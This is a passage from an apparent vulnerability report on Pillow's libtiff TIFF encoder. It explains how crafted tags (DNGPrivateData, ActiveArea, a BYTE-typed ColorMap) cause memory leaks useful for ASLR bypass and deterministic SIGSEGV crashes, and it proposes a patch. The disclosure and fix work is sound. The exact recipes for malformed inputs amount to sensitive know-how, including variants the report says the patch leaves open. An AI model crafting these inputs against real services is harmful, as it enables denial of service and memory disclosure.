ASLR bypass for chaining with any other memory bug; a gcc build of the same
source left a different, unrelated address in that slot. The fixed-count
variant kills the worker process with SIGSEGV from a 181-byte upload on every
request. With `tiffinfo=im.tag_v2` the source
address is fully attacker-chosen (16-byte arbitrary read into the output for
ActiveArea, or a crash). No non-default Pillow setting is involved; the only
precondition is TIFF-to-TIFF re-encoding.

The other branches add further deterministic process-kill inputs (BYTE-typed
ColorMap in any RGB or palette TIFF; `thumbnail()` keeps `tag_v2`, so
open→thumbnail→save-as-TIFF is affected too) and extend the reach to
JPEG/PNG/WebP uploads whose EXIF is preserved with `exif=` when converting to
libtiff-compressed TIFF. All the memory errors are reads; libtiff sizes its
destination buffers with the same count it copies, so no out-of-bounds write
was found.

## Reproducing

`repro` is one Python script, run against the stock build with the installed `PIL`. It needs no compiler and no extra files.

`upload(tag, value)` has Pillow write a 16×16 red RGB image as an LZW-compressed TIFF, then appends a new IFD holding the same entries plus one extra `<tag> / LONG / count 1 / value` (kept in tag order) and points the header at it — a 356-byte input on this tree. The source is LZW-compressed on purpose. A bare `im.save(out, "TIFF")` keeps the source's compression, so the save goes through the libtiff writer even though the application passes no arguments. `resave()` is the whole "application": `Image.open(BytesIO(src)); im.save(out, "TIFF")`.

The script runs three cases:

1. **Control, tag 65000 = 4096.** libtiff does not know this tag, so the file is re-saved correctly and the output tag reads back as the integer `4096`. This is what should happen to every tag.
2. **Leak, DNGPrivateData 50740 = 65536.** libtiff's built-in definition of this tag is a counted BYTE array. It reads Pillow's single scalar as the *count* and takes the data pointer from a vararg slot Pillow never wrote. The output tag comes back as `bytes` of length 65536 that do not occur in the input. The script prints the first 32 of them and the file offset at which they occur in `_imaging.so` on disk. On this build they always do (offset `0x57588`): the stale pointer aims into the extension's read-only data.
3. **Wild read, ActiveArea 50829 = 64.** libtiff defines this tag as a fixed LONG[4] array with no count, so it uses the scalar 64 as the *source address*. The script re-runs itself as a child process (`repro child`, core dumps disabled) to do this re-save, and the child exits with `-11`, meaning SIGSEGV.

Expected output on the affected tree:

```
control  tag 65000=4096 -> 4096
leak     tag 50740=65536 from a 356-byte upload -> 65536 bytes not present in input, head a661fcffc661fcff3360fcff7b61fcffd361fcff085ffcffe061fcff3360fcff
         leaked bytes found in _imaging.so at file offset 0x57588
crash    tag 50829=64 -> child exit -11 (SIGSEGV)
BUG
```

The script prints `BUG` if case 2 leaks or case 3 crashes. Both are deterministic on this build. A fixed Pillow prints `OK`: the tag does not come back as 65536 bytes of foreign data (it reads back as `None`, or `save()` raises `ValueError`/`RuntimeError`, which the script catches), and the child exits with something other than SIGSEGV (0, or 1 if `save()` raised).

The other branches can be checked by hand on the stock build in the same way
(each as `Image.open(f); im.save(BytesIO(), "TIFF")` in a child process):
a PackBits RGB TIFF with an extra IFD entry `320 / BYTE / 4 / "ABCD"` →
SIGSEGV every run; a PackBits palette TIFF whose ColorMap is `320 / BYTE / 2`
saved with `tiffinfo=im.tag_v2` → SIGSEGV every run; a Pillow-written JPEG
whose EXIF holds tag 50000 = RATIONAL×2 saved with
`compression="tiff_lzw", exif=im.info["exif"]` → SIGSEGV in most runs,
`RuntimeError` ("Failed to allocate memory for custom tag binary object
(-N elements of 4 bytes each)") in the rest.

## Suggested fix

The encoder must not guess the calling convention; it has to ask libtiff what
the tag's effective definition is *after* `ImagingLibTiffMergeFieldInfo` and
marshal accordingly, or refuse. The attached patch does this for non-core tags:

* a new `ImagingLibTiffFindField()` in `src/libImaging/TiffDecode.c` (declared
  in `TiffDecode.h`, next to the other libtiff wrappers) returns libtiff's
  `TIFFFindField` type, `passcount` and `writecount` for a tag;
* in `PyImaging_LibTiffEncoderNew` (`src/encode.c`), for a non-core tag that
  libtiff already knows, Pillow adopts libtiff's type when it has none of its
  own, and after `ImagingLibTiffMergeFieldInfo` a new `tiff_field_matches()`
  checks the value against libtiff's definition: a scalar only for a
  single-value field whose C argument type (int / `uint64_t` / double /
  `char *`) matches, an array only with libtiff's element size and, for
  fixed-count fields, exactly `writecount` elements. Anything else raises
  `ValueError("Tag value does not match libtiff field definition")` instead of
  reaching `TIFFSetField` — this covers the reproducer's DNGPrivateData and
  ActiveArea inputs, ASCII-typed Photoshop, short PrimaryChromaticities and the
  `LONG8` `tiffinfo=` variant;
* every tuple/`bytes` branch now goes through `set_tiff_array_field()`, which
  passes `len` only when the field has `passcount` set; this also fixes the
  `TIFF_RATIONAL` branch, which never passed a count (and extends it to
  `TIFF_SRATIONAL`);
* `TIFF_UNDEFINED` fields are registered as variable-length, matching how their
  `bytes` values are passed;
* `Tests/test_file_libtiff.py` gains a regression test (scalar DNGPrivateData,
  scalar and 2-tuple ActiveArea rejected; well-formed values round-trip).

Core tags and tags libtiff does not know keep their current behaviour. With the
patch applied to a clean checkout and rebuilt, the reproducer no longer
triggers and the test suite passes. It is not a complete fix, however: the
whole check sits inside `if (!is_core_tag)`, so the BYTE-typed ColorMap variant
stays open. The PackBits RGB TIFF carrying `320 / BYTE / 4`, re-saved with a
bare `save()`, no longer segfaults at this point but writes 1536 bytes —
over-read from the 5-byte `bytes` object and two stale varargs, including 22
live heap pointers — into the output ColorMap, which is still a disclosure.
Before merging, it needs a guard that accepts `TIFFTAG_COLORMAP` only through
the existing 768-tuple branch, never through the scalar or `bytes` branches,
and ideally the same shape check for the other core tags libtiff special-cases
in `_TIFFVSetField` (YCbCrSubsampling 530, TransferFunction 301,
ReferenceBlackWhite 532).

Narrower Python-side mitigations in `_save` close individual entry points but
not the class, and are worth adding alongside the C-side check: drop tags
with `TiffTags.lookup(tag).type is None` from `supplied_tags` (closes the `Image.open()→save()` path shown here but not
`tiffinfo=` callers); remove `COLORMAP` from `supplied_tags` next to
`EXIFIFD`/`SAMPLEFORMAT` and extend the `IPTC_NAA_CHUNK` BYTE/UNDEFINED type
guard to `PHOTOSHOP_CHUNK` and `XMP`; add 318/319/529 to the blocklist next to
`REFERENCEBLACKWHITE`; and have `_save` `ifd.tagtype.pop(tag, None)` before
assigning its own ColorMap/BitsPerSample/ICCProfile/… values so a
`tiffinfo=`-imported type cannot reshape them. The C-side check is the fix to
rely on.

<summary>Reproducer — <code>repro</code>, 2,545 bytes (click to open)</summary>
